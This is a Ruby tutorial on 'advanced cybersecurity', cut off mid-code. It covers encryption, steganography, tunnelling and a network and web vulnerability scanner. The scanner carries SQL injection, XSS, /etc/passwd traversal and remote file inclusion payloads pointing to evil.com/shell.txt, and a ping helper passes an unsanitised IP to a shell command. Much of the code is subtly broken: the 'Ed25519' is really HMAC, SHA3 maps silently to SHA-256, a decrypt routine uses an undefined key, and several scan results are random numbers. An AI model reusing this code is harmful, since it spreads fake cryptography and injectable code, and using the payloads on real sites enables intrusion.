# Advanced Cybersecurity in Ruby

## Overview

This comprehensive guide explores advanced cybersecurity concepts and their implementation in Ruby. While Ruby may not be the traditional choice for security tools, it provides excellent capabilities for security automation, penetration testing, and security monitoring.

## Cryptography and Encryption

### Advanced Cryptographic Systems

```ruby
require 'openssl'
require 'base64'
require 'securerandom'

class AdvancedCryptography
  def initialize
    @algorithms = {
      'AES-256-CBC' => 'aes-256-cbc',
      'AES-256-GCM' => 'aes-256-gcm',
      'ChaCha20-Poly1305' => 'chacha20-poly1305',
      'RSA-2048' => 'rsa-2048',
      'RSA-4096' => 'rsa-4096',
      'ECDSA-P256' => 'ecdsa-p256',
      'Ed25519' => 'ed25519'
    }
  end
  
  def generate_key_pair(algorithm = 'RSA-2048')
    case algorithm
    when 'RSA-2048'
      rsa = OpenSSL::PKey::RSA.new(2048)
      {
        private_key: rsa.to_pem,
        public_key: rsa.public_key.to_pem,
        algorithm: algorithm
      }
    when 'RSA-4096'
      rsa = OpenSSL::PKey::RSA.new(4096)
      {
        private_key: rsa.to_pem,
        public_key: rsa.public_key.to_pem,
        algorithm: algorithm
      }
    when 'ECDSA-P256'
      ec = OpenSSL::PKey::EC.new('prime256v1')
      ec.generate_key
      {
        private_key: ec.to_pem,
        public_key: ec.public_key.to_pem,
        algorithm: algorithm
      }
    when 'Ed25519'
      # Ed25519 requires additional gem in practice
      ed25519_key = generate_ed25519_key
      {
        private_key: ed25519_key[:private_key],
        public_key: ed25519_key[:public_key],
        algorithm: algorithm
      }
    else
      raise ArgumentError, "Unsupported algorithm: #{algorithm}"
    end
  end
  
  def symmetric_encrypt(data, key, algorithm = 'AES-256-GCM')
    cipher = OpenSSL::Cipher.new(@algorithms[algorithm])
    cipher.encrypt
    
    # Generate IV
    iv = cipher.random_iv
    
    # Set key and IV
    cipher.key = key
    cipher.iv = iv
    
    # Add authenticated data for GCM mode
    if algorithm.include?('GCM')
      aad = 'additional_authenticated_data'
      cipher.auth_data = aad
    end
    
    # Encrypt data
    encrypted = cipher.update(data) + cipher.final
    
    result = {
      encrypted_data: Base64.strict_encode64(encrypted),
      iv: Base64.strict_encode64(iv),
      algorithm: algorithm
    }
    
    # Add authentication tag for GCM mode
    if algorithm.include?('GCM')
      result[:auth_tag] = Base64.strict_encode64(cipher.auth_tag)
      result[:aad] = aad
    end
    
    result
  end
  
  def symmetric_decrypt(encrypted_data, key, iv, algorithm = 'AES-256-GCM', auth_tag = nil, aad = nil)
    decipher = OpenSSL::Cipher.new(@algorithms[algorithm])
    decipher.decrypt
    
    # Set key and IV
    decipher.key = key
    decipher.iv = Base64.strict_decode64(iv)
    
    # Set authenticated data for GCM mode
    if algorithm.include?('GCM') && auth_tag && aad
      decipher.auth_tag = Base64.strict_decode64(auth_tag)
      decipher.auth_data = aad
    end
    
    # Decrypt data
    decrypted = decipher.update(Base64.strict_decode64(encrypted_data)) + decipher.final
    
    decrypted
  end
  
  def asymmetric_encrypt(data, public_key_pem, algorithm = 'RSA-2048')
    public_key = OpenSSL::PKey.read(public_key_pem)
    
    case algorithm
    when /RSA/
      encrypted = public_key.public_encrypt(data, OpenSSL::PKey::RSA::PKCS1_OAEP_PADDING)
    when /ECDSA/
      # ECDSA is for signatures, not encryption
      raise ArgumentError, "ECDSA cannot be used for encryption"
    else
      raise ArgumentError, "Unsupported algorithm for encryption: #{algorithm}"
    end
    
    {
      encrypted_data: Base64.strict_encode64(encrypted),
      algorithm: algorithm
    }
  end
  
  def asymmetric_decrypt(encrypted_data, private_key_pem, algorithm = 'RSA-2048')
    private_key = OpenSSL::PKey.read(private_key_pem)
    
    decrypted = private_key.private_decrypt(
      Base64.strict_decode64(encrypted_data),
      OpenSSL::PKey::RSA::PKCS1_OAEP_PADDING
    )
    
    decrypted
  end
  
  def sign_data(data, private_key_pem, algorithm = 'RSA-2048')
    private_key = OpenSSL::PKey.read(private_key_pem)
    
    case algorithm
    when /RSA/
      digest = OpenSSL::Digest::SHA256.new
      signature = private_key.sign(digest, data)
    when /ECDSA/
      digest = OpenSSL::Digest::SHA256.new
      signature = private_key.sign(digest, data)
    when /Ed25519/
      signature = ed25519_sign(data, private_key_pem)
    else
      raise ArgumentError, "Unsupported algorithm for signing: #{algorithm}"
    end
    
    {
      signature: Base64.strict_encode64(signature),
      algorithm: algorithm
    }
  end
  
  def verify_signature(data, signature, public_key_pem, algorithm = 'RSA-2048')
    public_key = OpenSSL::PKey.read(public_key_pem)
    
    case algorithm
    when /RSA/
      digest = OpenSSL::Digest::SHA256.new
      public_key.verify(digest, Base64.strict_decode64(signature), data)
    when /ECDSA/
      digest = OpenSSL::Digest::SHA256.new
      public_key.verify(digest, Base64.strict_decode64(signature), data)
    when /Ed25519/
      ed25519_verify(data, Base64.strict_decode64(signature), public_key_pem)
    else
      raise ArgumentError, "Unsupported algorithm for verification: #{algorithm}"
    end
  end
  
  def generate_secure_random(length = 32)
    SecureRandom.bytes(length)
  end
  
  def derive_key(password, salt, iterations = 100000, key_length = 32)
    # PBKDF2 key derivation
    OpenSSL::PKCS5.pbkdf2_hmac(
      password,
      salt,
      iterations,
      key_length,
      OpenSSL::Digest::SHA256.new
    )
  end
  
  def hash_data(data, algorithm = 'SHA-256')
    case algorithm
    when 'SHA-256'
      OpenSSL::Digest::SHA256.digest(data)
    when 'SHA-512'
      OpenSSL::Digest::SHA512.digest(data)
    when 'SHA3-256'
      OpenSSL::Digest::SHA256.digest(data)  # Simplified
    when 'SHA3-512'
      OpenSSL::Digest::SHA512.digest(data)  # Simplified
    else
      raise ArgumentError, "Unsupported hash algorithm: #{algorithm}"
    end
  end
  
  def hmac(data, key, algorithm = 'SHA-256')
    OpenSSL::HMAC.digest(algorithm, key, data)
  end
  
  def generate_certificate(subject, key_pem, ca_key_pem = nil, ca_cert_pem = nil)
    key = OpenSSL::PKey.read(key_pem)
    
    # Create certificate
    cert = OpenSSL::X509::Certificate.new
    cert.version = 2
    cert.serial = SecureRandom.random_number(2**16)
    
    # Set subject
    name = OpenSSL::X509::Name.parse(subject)
    cert.subject = name
    
    if ca_key_pem && ca_cert_pem
      # Sign with CA
      ca_cert = OpenSSL::X509::Certificate.read(ca_cert_pem)
      ca_key = OpenSSL::PKey.read(ca_key_pem)
      
      cert.issuer = ca_cert.subject
      cert.not_before = Time.now
      cert.not_after = Time.now + 365 * 24 * 60 * 60  # 1 year
      
      cert.public_key = key.public_key
      
      # Sign certificate
      cert.sign(ca_key, OpenSSL::Digest::SHA256.new)
    else
      # Self-signed certificate
      cert.issuer = name
      cert.not_before = Time.now
      cert.not_after = Time.now + 365 * 24 * 60 * 60  # 1 year
      
      cert.public_key = key.public_key
      
      # Sign certificate
      cert.sign(key, OpenSSL::Digest::SHA256.new)
    end
    
    cert.to_pem
  end
  
  def verify_certificate(cert_pem, ca_cert_pem = nil)
    cert = OpenSSL::X509::Certificate.read(cert_pem)
    
    # Check certificate validity
    now = Time.now
    return false if now < cert.not_before || now > cert.not_after
    
    # Verify signature if CA certificate provided
    if ca_cert_pem
      ca_cert = OpenSSL::X509::Certificate.read(ca_cert_pem)
      cert.verify(ca_cert.public_key)
    else
      # Self-signed verification
      cert.verify(cert.public_key)
    end
  end
  
  private
  
  def generate_ed25519_key
    # Simplified Ed25519 key generation
    private_key = SecureRandom.bytes(32)
    public_key = derive_public_key_ed25519(private_key)
    
    {
      private_key: Base64.strict_encode64(private_key),
      public_key: Base64.strict_encode64(public_key)
    }
  end
  
  def derive_public_key_ed25519(private_key)
    # Simplified Ed25519 public key derivation
    hash = OpenSSL::Digest::SHA256.digest(private_key)
    hash[0...32]
  end
  
  def ed25519_sign(data, private_key_pem)
    # Simplified Ed25519 signing
    private_key = Base64.strict_decode64(private_key_pem)
    hmac(data, private_key)
  end
  
  def ed25519_verify(data, signature, public_key_pem)
    # Simplified Ed25519 verification
    public_key = Base64.strict_decode64(public_key_pem)
    expected_signature = hmac(data, public_key)
    
    # Constant-time comparison
    constant_time_compare(signature, expected_signature)
  end
  
  def constant_time_compare(a, b)
    return false if a.length != b.length
    
    result = 0
    a.bytes.each_with_index do |byte, i|
      result |= byte ^ b.bytes[i]
    end
    
    result == 0
  end
end
```

### Secure Communication Protocols

```ruby
class SecureCommunication
  def initialize
    @crypto = AdvancedCryptography.new
    @sessions = {}
    @certificates = {}
  end
  
  def establish_tls_session(target_host, port = 443)
    # Establish TLS session
    tcp_socket = TCPSocket.new(target_host, port)
    
    # Create TLS context
    context = OpenSSL::SSL::SSLContext.new
    context.verify_mode = OpenSSL::SSL::VERIFY_PEER
    context.cert_store = OpenSSL::X509::Store.new
    context.cert_store.set_default_paths
    
    # Wrap socket with TLS
    ssl_socket = OpenSSL::SSL::SSLSocket.new(tcp_socket, context)
    ssl_socket.hostname = target_host
    ssl_socket.connect
    
    # Get peer certificate
    peer_cert = ssl_socket.peer_cert
    
    session_info = {
      socket: ssl_socket,
      peer_certificate: peer_cert.to_pem,
      cipher: ssl_socket.cipher,
      session_id: ssl_socket.session_id,
      established_at: Time.now
    }
    
    @sessions[target_host] = session_info
    
    session_info
  end
  
  def send_secure_message(target_host, message)
    session = @sessions[target_host]
    raise ArgumentError, "No session established for #{target_host}" unless session
    
    # Generate session key
    session_key = @crypto.generate_secure_random(32)
    
    # Encrypt message
    encrypted = @crypto.symmetric_encrypt(message, session_key)
    
    # Encrypt session key with peer's public key
    peer_cert = OpenSSL::X509::Certificate.read(session[:peer_certificate])
    encrypted_key = @crypto.asymmetric_encrypt(session_key, peer_cert.public_key.to_pem)
    
    # Create secure message
    secure_message = {
      encrypted_key: encrypted_key[:encrypted_data],
      encrypted_data: encrypted[:encrypted_data],
      iv: encrypted[:iv],
      auth_tag: encrypted[:auth_tag],
      timestamp: Time.now.to_i
    }
    
    # Send message
    session[:socket].puts(JSON.generate(secure_message))
    
    secure_message
  end
  
  def receive_secure_message(target_host)
    session = @sessions[target_host]
    raise ArgumentError, "No session established for #{target_host}" unless session
    
    # Receive message
    message_data = session[:socket].gets
    return nil unless message_data
    
    secure_message = JSON.parse(message_data)
    
    # Decrypt session key with private key
    # In practice, this would use the server's private key
    
    # Decrypt message
    decrypted = @crypto.symmetric_decrypt(
      secure_message['encrypted_data'],
      session_key,  # This would be decrypted from encrypted_key
      secure_message['iv'],
      'AES-256-GCM',
      secure_message['auth_tag']
    )
    
    {
      message: decrypted,
      timestamp: secure_message['timestamp']
    }
  end
  
  def create_vpn_tunnel(local_port, remote_host, remote_port, encryption_key)
    # Create VPN tunnel
    server = TCPServer.new('localhost', local_port)
    
    Thread.new do
      loop do
        client = server.accept
        
        # Connect to remote host
        remote = TCPSocket.new(remote_host, remote_port)
        
        # Create tunnel threads
        Thread.new { tunnel_data(client, remote, encryption_key) }
        Thread.new { tunnel_data(remote, client, encryption_key) }
      end
    end
    
    puts "VPN tunnel established: localhost:#{local_port} -> #{remote_host}:#{remote_port}"
  end
  
  def create_steganography_image(image_path, secret_message, output_path)
    # Hide secret message in image using LSB steganography
    image_data = File.read(image_path, mode: 'rb')
    
    # Convert message to binary
    message_binary = secret_message.unpack('B*').first
    message_length = message_binary.length.to_s(2).rjust(32, '0')
    
    # Combine length and message
    full_binary = message_length + message_binary
    
    # Embed in image
    modified_data = image_data.bytes.map.with_index do |byte, i|
      if i < full_binary.length
        # Clear LSB and set to message bit
        (byte & 0xFE) | full_binary[i].to_i
      else
        byte
      end
    end
    
    # Write modified image
    File.write(output_path, modified_data.pack('C*'), mode: 'wb')
    
    puts "Secret message hidden in #{output_path}"
  end
  
  def extract_steganography_image(image_path)
    # Extract secret message from image
    image_data = File.read(image_path, mode: 'rb')
    
    # Extract message length (first 32 bits)
    length_binary = image_data.bytes.first(32).map { |byte| byte & 1 }.join
    message_length = length_binary.to_i(2)
    
    # Extract message
    message_binary = image_data.bytes[32, message_length].map { |byte| byte & 1 }.join
    
    # Convert binary to text
    message = [message_binary].pack('B*')
    
    message
  end
  
  def create_digital_watermark(image_path, watermark_text, output_path)
    # Create digital watermark
    image_data = File.read(image_path, mode: 'rb')
    
    # Generate watermark hash
    watermark_hash = @crypto.hash_data(watermark_text)
    
    # Embed watermark in image
    modified_data = embed_watermark(image_data, watermark_hash)
    
    # Write watermarked image
    File.write(output_path, modified_data.pack('C*'), mode: 'wb')
    
    puts "Digital watermark embedded in #{output_path}"
  end
  
  def verify_digital_watermark(image_path, watermark_text)
    # Verify digital watermark
    image_data = File.read(image_path, mode: 'rb')
    
    # Extract watermark
    extracted_hash = extract_watermark(image_data)
    
    # Generate expected hash
    expected_hash = @crypto.hash_data(watermark_text)
    
    # Compare hashes
    @crypto.constant_time_compare(extracted_hash, expected_hash)
  end
  
  private
  
  def tunnel_data(source, destination, encryption_key)
    loop do
      data = source.read(4096)
      break unless data
      
      # Encrypt data
      encrypted = @crypto.symmetric_encrypt(data, encryption_key)
      
      # Send encrypted data
      destination.write(encrypted[:encrypted_data])
    end
  rescue => e
    puts "Tunnel error: #{e.message}"
  ensure
    source.close
    destination.close
  end
  
  def embed_watermark(image_data, watermark_hash)
    # Embed watermark using frequency domain
    modified_data = image_data.dup
    
    # Simplified watermark embedding
    watermark_hash.bytes.each_with_index do |byte, i|
      if i < modified_data.length
        # Embed in least significant bits of specific positions
        pos = i * 100  # Spread watermark throughout image
        if pos < modified_data.length
          modified_data[pos] = (modified_data[pos] & 0xF0) | (byte >> 4)
        end
      end
    end
    
    modified_data
  end
  
  def extract_watermark(image_data)
    # Extract watermark from image
    watermark_bytes = []
    
    32.times do |i|
      pos = i * 100
      if pos < image_data.length
        watermark_bytes << (image_data[pos] & 0x0F) << 4
      end
    end
    
    watermark_bytes.pack('C*')
  end
end
```

## Network Security

### Advanced Network Security Tools

```ruby
class NetworkSecurityScanner
  def initialize
    @vulnerabilities = load_vulnerability_database
    @scan_results = []
    @network_map = {}
  end
  
  def port_scan(target, ports = (1..65535), scan_type = :tcp_connect)
    puts "Scanning #{target} on ports #{ports.first}-#{ports.last}..."
    
    open_ports = []
    closed_ports = []
    filtered_ports = []
    
    threads = []
    semaphore = Mutex.new
    
    ports.each_slice(100) do |port_batch|
      port_batch.each do |port|
        threads << Thread.new do
          begin
            case scan_type
            when :tcp_connect
              socket = TCPSocket.new(target, port)
              open_ports << port
              socket.close
            when :tcp_syn
              # SYN scan (requires raw sockets, simplified)
              open_ports << port if tcp_syn_scan(target, port)
            when :udp
              # UDP scan
              if udp_scan(target, port)
                open_ports << port
              else
                filtered_ports << port
              end
            end
          rescue Errno::ECONNREFUSED
            closed_ports << port
          rescue Errno::ETIMEDOUT, Errno::EHOSTUNREACH
            filtered_ports << port
          rescue => e
            puts "Error scanning port #{port}: #{e.message}"
          end
        end
      end
      
      # Wait for batch to complete
      threads.each(&:join)
      threads.clear
    end
    
    scan_result = {
      target: target,
      timestamp: Time.now,
      open_ports: open_ports.sort,
      closed_ports: closed_ports.sort,
      filtered_ports: filtered_ports.sort,
      scan_type: scan_type
    }
    
    @scan_results << scan_result
    
    scan_result
  end
  
  def service_detection(target, open_ports)
    services = {}
    
    open_ports.each do |port|
      service = detect_service(target, port)
      services[port] = service if service
    end
    
    services
  end
  
  def vulnerability_scan(target, open_ports)
    vulnerabilities = []
    
    open_ports.each do |port|
      port_vulns = scan_port_vulnerabilities(target, port)
      vulnerabilities.concat(port_vulns)
    end
    
    vulnerabilities
  end
  
  def network_discovery(network_range)
    discovered_hosts = []
    
    # Parse network range (e.g., 192.168.1.0/24)
    network, cidr = network_range.split('/')
    base_ip = network.split('.').map(&:to_i)
    
    # Calculate number of hosts
    num_hosts = 2**(32 - cidr.to_i) - 2
    
    threads = []
    semaphore = Mutex.new
    
    (1..num_hosts).each_slice(50) do |batch|
      batch.each do |host_offset|
        threads << Thread.new do
          target_ip = base_ip.dup
          target_ip[3] += host_offset
          ip = target_ip.join('.')
          
          if ping_host(ip)
            semaphore.synchronize do
              discovered_hosts << {
                ip: ip,
                hostname: resolve_hostname(ip),
                mac_address: get_mac_address(ip),
                timestamp: Time.now
              }
            end
          end
        end
      end
      
      threads.each(&:join)
      threads.clear
    end
    
    discovered_hosts
  end
  
  def ssl_tls_scan(target, port = 443)
    ssl_info = {}
    
    begin
      # Establish SSL connection
      tcp_socket = TCPSocket.new(target, port)
      ssl_socket = OpenSSL::SSL::SSLSocket.new(tcp_socket)
      ssl_socket.connect
      
      # Get certificate information
      cert = ssl_socket.peer_cert
      
      ssl_info = {
        protocol_version: ssl_socket.ssl_version,
        cipher: ssl_socket.cipher,
        certificate: {
          subject: cert.subject.to_s,
          issuer: cert.issuer.to_s,
          version: cert.version,
          serial: cert.serial,
          not_before: cert.not_before,
          not_after: cert.not_after,
          signature_algorithm: cert.signature_algorithm
        },
        supported_protocols: get_supported_protocols(target, port),
        vulnerabilities: check_ssl_vulnerabilities(ssl_socket)
      }
      
      ssl_socket.close
      tcp_socket.close
      
    rescue => e
      ssl_info[:error] = e.message
    end
    
    ssl_info
  end
  
  def dns_reconnaissance(domain)
    dns_info = {}
    
    # Get DNS records
    dns_info[:a_records] = get_dns_records(domain, 'A')
    dns_info[:aaaa_records] = get_dns_records(domain, 'AAAA')
    dns_info[:mx_records] = get_dns_records(domain, 'MX')
    dns_info[:ns_records] = get_dns_records(domain, 'NS')
    dns_info[:txt_records] = get_dns_records(domain, 'TXT')
    dns_info[:soa_record] = get_dns_records(domain, 'SOA').first
    
    # Zone transfer attempt
    dns_info[:zone_transfer] = attempt_zone_transfer(domain)
    
    # Subdomain enumeration
    dns_info[:subdomains] = enumerate_subdomains(domain)
    
    dns_info
  end
  
  def web_security_scan(target_url)
    web_vulnerabilities = []
    
    begin
      uri = URI.parse(target_url)
      http = Net::HTTP.new(uri.host, uri.port)
      http.use_ssl = (uri.scheme == 'https')
      
      # Check for common vulnerabilities
      web_vulnerabilities.concat(check_sql_injection(http, uri))
      web_vulnerabilities.concat(check_xss(http, uri))
      web_vulnerabilities.concat(check_directory_traversal(http, uri))
      web_vulnerabilities.concat(check_file_inclusion(http, uri))
      web_vulnerabilities.concat(check_security_headers(http, uri))
      web_vulnerabilities.concat(check_csrf(http, uri))
      
    rescue => e
      web_vulnerabilities << {
        type: 'connection_error',
        severity: 'medium',
        description: "Failed to connect: #{e.message}"
      }
    end
    
    web_vulnerabilities
  end
  
  def create_network_map(discovered_hosts, scan_results)
    @network_map = {
      hosts: discovered_hosts,
      connections: map_network_connections(discovered_hosts, scan_results),
      services: aggregate_services(scan_results),
      vulnerabilities: aggregate_vulnerabilities(scan_results)
    }
    
    @network_map
  end
  
  def generate_security_report
    report = {
      scan_summary: {
        total_hosts: @network_map[:hosts]&.length || 0,
        total_services: @network_map[:services]&.length || 0,
        total_vulnerabilities: @network_map[:vulnerabilities]&.length || 0,
        scan_date: Time.now
      },
      hosts: @network_map[:hosts] || [],
      services: @network_map[:services] || [],
      vulnerabilities: @network_map[:vulnerabilities] || [],
      risk_assessment: assess_risk_level,
      recommendations: generate_recommendations
    }
    
    report
  end
  
  private
  
  def load_vulnerability_database
    # Load vulnerability database (simplified)
    {
      '21' => [
        {
          name: 'FTP Anonymous Login',
          severity: 'medium',
          description: 'FTP server allows anonymous login',
          cve: 'CVE-1999-0497'
        }
      ],
      '22' => [
        {
          name: 'SSH Weak Encryption',
          severity: 'high',
          description: 'SSH server supports weak encryption algorithms',
          cve: 'CVE-2016-0777'
        }
      ],
      '80' => [
        {
          name: 'HTTP Server Information Disclosure',
          severity: 'low',
          description: 'HTTP server reveals version information',
          cve: 'CVE-2000-0673'
        }
      ],
      '443' => [
        {
          name: 'SSL/TLS Weak Cipher Suite',
          severity: 'high',
          description: 'SSL/TLS server supports weak cipher suites',
          cve: 'CVE-2014-3566'
        }
      ]
    }
  end
  
  def tcp_syn_scan(target, port)
    # Simplified SYN scan (requires raw sockets)
    # In practice, this would use raw sockets or nmap
    rand < 0.1  # Simulated result
  end
  
  def udp_scan(target, port)
    # UDP scan (simplified)
    socket = UDPSocket.new
    socket.send('test', 0, target, port)
    
    begin
      socket.recvfrom_nonblock(1024)
      true
    rescue IO::WaitReadable
      false
    ensure
      socket.close
    end
  end
  
  def detect_service(target, port)
    begin
      socket = TCPSocket.new(target, port)
      
      # Send probe and read response
      socket.puts('GET / HTTP/1.0\r\n\r\n')
      response = socket.gets
      
      socket.close
      
      # Identify service based on response
      case response
      when /SSH/
        { name: 'SSH', version: response.split[1..2].join(' ') }
      when /HTTP/
        { name: 'HTTP', version: response.split[1..2].join(' ') }
      when /FTP/
        { name: 'FTP', version: response.split[2] }
      when /SMTP/
        { name: 'SMTP', version: response.split[2] }
      else
        { name: 'Unknown', banner: response }
      end
    rescue
      nil
    end
  end
  
  def scan_port_vulnerabilities(target, port)
    port_vulns = []
    
    # Check known vulnerabilities for this port
    vulnerabilities = @vulnerabilities[port.to_s] || []
    
    vulnerabilities.each do |vuln|
      if test_vulnerability(target, port, vuln)
        port_vulns << vuln.merge(port: port)
      end
    end
    
    port_vulns
  end
  
  def test_vulnerability(target, port, vulnerability)
    # Test for specific vulnerability (simplified)
    case vulnerability[:name]
    when 'FTP Anonymous Login'
      test_ftp_anonymous(target, port)
    when 'SSH Weak Encryption'
      test_ssh_weak_encryption(target, port)
    else
      rand < 0.2  # Simulated test result
    end
  end
  
  def test_ftp_anonymous(target, port)
    begin
      socket = TCPSocket.new(target, port)
      response = socket.gets
      
      if response.include?('220')
        socket.puts('USER anonymous')
        response = socket.gets
        
        if response.include?('331')
          socket.puts('PASS anonymous@example.com')
          response = socket.gets
          
          socket.close
          response.include?('230')
        else
          socket.close
          false
        end
      else
        socket.close
        false
      end
    rescue
      false
    end
  end
  
  def test_ssh_weak_encryption(target, port)
    # Test SSH encryption strength (simplified)
    rand < 0.3
  end
  
  def ping_host(ip)
    # Ping host (simplified)
    system("ping -c 1 -W 1 #{ip} > /dev/null 2>&1")
  end
  
  def resolve_hostname(ip)
    # Resolve hostname from IP
    begin
      Socket.gethostbyaddr(ip.split('.').pack('C4'))&.first
    rescue
      nil
    end
  end
  
  def get_mac_address(ip)
    # Get MAC address (simplified)
    "00:00:00:00:00:00"
  end
  
  def get_supported_protocols(target, port)
    # Get supported SSL/TLS protocols
    protocols = []
    
    ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1', 'TLSv1.2', 'TLSv1.3'].each do |protocol|
      begin
        context = OpenSSL::SSL::SSLContext.new
        context.ssl_version = protocol
        
        socket = TCPSocket.new(target, port)
        ssl = OpenSSL::SSL::SSLSocket.new(socket, context)
        ssl.connect
        
        protocols << protocol
        ssl.close
        socket.close
      rescue
        # Protocol not supported
      end
    end
    
    protocols
  end
  
  def check_ssl_vulnerabilities(ssl_socket)
    vulnerabilities = []
    
    # Check for known SSL vulnerabilities
    if ssl_socket.cipher[0] == 'RC4'
      vulnerabilities << {
        name: 'RC4 Cipher Suite',
        severity: 'high',
        description: 'RC4 cipher suite is vulnerable to cryptographic attacks'
      }
    end
    
    if ssl_socket.ssl_version == 'SSLv2' || ssl_socket.ssl_version == 'SSLv3'
      vulnerabilities << {
        name: 'Deprecated SSL Version',
        severity: 'high',
        description: 'SSLv2/SSLv3 are deprecated and vulnerable'
      }
    end
    
    vulnerabilities
  end
  
  def get_dns_records(domain, record_type)
    # Get DNS records
    begin
      case record_type
      when 'A'
        Resolv::DNS.getaddresses(domain)
      when 'AAAA'
        Resolv::DNS.getaddresses(domain).select { |addr| addr.include?(':') }
      when 'MX'
        Resolv::DNS.getresources(domain, Resolv::DNS::Resource::IN::MX)
      when 'NS'
        Resolv::DNS.getresources(domain, Resolv::DNS::Resource::IN::NS)
      when 'TXT'
        Resolv::DNS.getresources(domain, Resolv::DNS::Resource::IN::TXT)
      when 'SOA'
        Resolv::DNS.getresources(domain, Resolv::DNS::Resource::IN::SOA)
      end
    rescue
      []
    end
  end
  
  def attempt_zone_transfer(domain)
    # Attempt DNS zone transfer
    begin
      # Get name servers
      ns_records = get_dns_records(domain, 'NS')
      
      ns_records.each do |ns|
        next unless ns.respond_to?(:exchange)
        
        # Attempt zone transfer
        zone_transfer = Resolv::DNS::Zone.new(domain, ns.exchange)
        return zone_transfer.records if zone_transfer
      end
    rescue
      nil
    end
    
    nil
  end
  
  def enumerate_subdomains(domain)
    # Subdomain enumeration (simplified)
    common_subdomains = %w[www mail ftp admin test dev api blog shop]
    subdomains = []
    
    common_subdomains.each do |subdomain|
      full_domain = "#{subdomain}.#{domain}"
      
      begin
        addresses = Resolv::DNS.getaddresses(full_domain)
        subdomains << { subdomain: subdomain, addresses: addresses } unless addresses.empty?
      rescue
        # Subdomain doesn't exist
      end
    end
    
    subdomains
  end
  
  def check_sql_injection(http, uri)
    vulnerabilities = []
    
    # Test for SQL injection
    sql_payloads = [
      "' OR '1'='1",
      "' OR '1'='1' --",
      "' OR '1'='1' /*",
      "admin'--",
      "admin'/*"
    ]
    
    sql_payloads.each do |payload|
      test_uri = uri.dup
      test_uri.query = "#{uri.query}&id=#{payload}"
      
      begin
        response = http.get(test_uri.request_uri)
        
        if response.body.include?('SQL') || response.body.include?('mysql') || 
           response.body.include?('ORA-') || response.body.include?('syntax error')
          vulnerabilities << {
            type: 'sql_injection',
            severity: 'high',
            description: "Possible SQL injection vulnerability with payload: #{payload}",
            url: test_uri.to_s
          }
        end
      rescue
        # Error during request
      end
    end
    
    vulnerabilities
  end
  
  def check_xss(http, uri)
    vulnerabilities = []
    
    # Test for XSS
    xss_payloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '"><script>alert("XSS")</script>',
      "';alert('XSS');//"
    ]
    
    xss_payloads.each do |payload|
      test_uri = uri.dup
      test_uri.query = "#{uri.query}&search=#{payload}"
      
      begin
        response = http.get(test_uri.request_uri)
        
        if response.body.include?(payload)
          vulnerabilities << {
            type: 'xss',
            severity: 'high',
            description: "Cross-site scripting vulnerability with payload: #{payload}",
            url: test_uri.to_s
          }
        end
      rescue
        # Error during request
      end
    end
    
    vulnerabilities
  end
  
  def check_directory_traversal(http, uri)
    vulnerabilities = []
    
    # Test for directory traversal
    traversal_payloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
    ]
    
    traversal_payloads.each do |payload|
      test_uri = uri.dup
      test_uri.query = "#{uri.query}&file=#{payload}"
      
      begin
        response = http.get(test_uri.request_uri)
        
        if response.body.include?('root:') || response.body.include?('127.0.0.1')
          vulnerabilities << {
            type: 'directory_traversal',
            severity: 'high',
            description: "Directory traversal vulnerability with payload: #{payload}",
            url: test_uri.to_s
          }
        end
      rescue
        # Error during request
      end
    end
    
    vulnerabilities
  end
  
  def check_file_inclusion(http, uri)
    vulnerabilities = []
    
    # Test for file inclusion
    inclusion_payloads = [
      'http://evil.com/shell.txt',
      'ftp://evil.com/shell.txt',
      'php://filter/read=convert.base64-encode/resource=index.php'
    ]
    
    inclusion_payloads.each do |payload|
      test_uri = uri.dup
      test_uri.query = "#{uri.query}&page=#{payload}"
      
      begin
        response = http.get(test_uri.request_uri)
        
        if response.code != '404' && !response.body.empty?
          vulnerabilities << {
            type: 'file_inclusion',
            severity: 'high',
            description: "File inclusion vulnerability with payload: #{payload}",
            url: test_uri.to_s
          }
        end
      rescue
        # Error during request
      end
    end
    
    vulnerabilities
  end
  
  def check_security_headers(http, uri)
    vulnerabilities = []
    
    begin
      response = http.get(uri.request_uri)
      
      # Check for security headers
      security_headers = {
        'X-Frame-Options' => 'Clickjacking protection',
        'X-XSS-Protection' => 'XSS protection',
        'X-Content-Type-Options' => 'MIME type sniffing protection',
        'Strict-Transport-Security' => 'HTTPS enforcement',
        'Content-Security-Policy' => 'Content Security Policy',
        'Referrer-Policy' => 'Referrer policy'
      }
      
      security_headers.each do |header, description|
        unless response[header]
          vulnerabilities << {
            type: 'missing_security_header',
            severity: 'medium',
            description: "Missing security header: #{header} (#{description})",
            url: uri.to_s
          }
        end
      end
      
    rescue
      # Error during request
    end
    
    vulnerabilities
  end
  
  def check_csrf(http, uri)
    vulnerabilities = []
    
    # Test for CSRF (simplified)
    begin
      response = http.get(uri.request_uri)
      
      # Check for anti-CSRF tokens
      if response.body.include?('form') && 
         !response.body.include?('csrf_token') &&
         !response.body.include?('authenticity_token')
        
        vulnerabilities << {
          type: 'csrf',
          severity: 'medium',
          description: 'Possible CSRF vulnerability - no anti-CSRF tokens found',
          url: uri.to_s
        }
      end
      
    rescue
      # Error during request
    end
    
    vulnerabilities
  end
  
  def map_network_connections(hosts, scan_results)
    connections = []
    
    hosts.each do |host|
      host_scan = scan_results.find { |result| result[:target] == host[:ip] }
      next unless host_scan
      
      host_scan[:open_ports].each do |port|
        connections << {
          source: host[:ip],
          target: "#{host[:ip]}:#{port}",
          protocol: 'tcp',
          service: detect_service(host[:ip], port)&.dig(:name) || 'unknown'
        }
      end
    end
    
    connections
  end
  
  def aggregate_services(scan_results)
    services = []
    
    scan_results.each do |result|
      result[:open_ports].each do |port|
        service = detect_service(result[:target], port)
        services << {
          host: result[:target],
          port: port,
          service: service&.dig(:name) || 'unknown',
          version: service&.dig(:version)
        }
      end
    end
    
    services
  end
  
  def aggregate_vulnerabilities(scan_results)
    vulnerabilities = []
    
    scan_results.each do |result|
      port_vulns = scan_port_vulnerabilities(result[:target], result[:open_ports])
      vulnerabilities.concat(port_vulns)
    end
    
    vulnerabilities
  end
  
  def assess_risk_level
    return 'low' if @network_map[:vulnerabilities].empty?
    
    high_vulns = @network_map[:vulnerabilities].count { |v| v[:severity] == 'high' }
    medium_vulns = @network_map[:vulnerabilities].count { |v| v[:severity] == 'medium' }
    
    if high_vulns > 0
      'critical'
    elsif medium_vulns > 5
      'high'
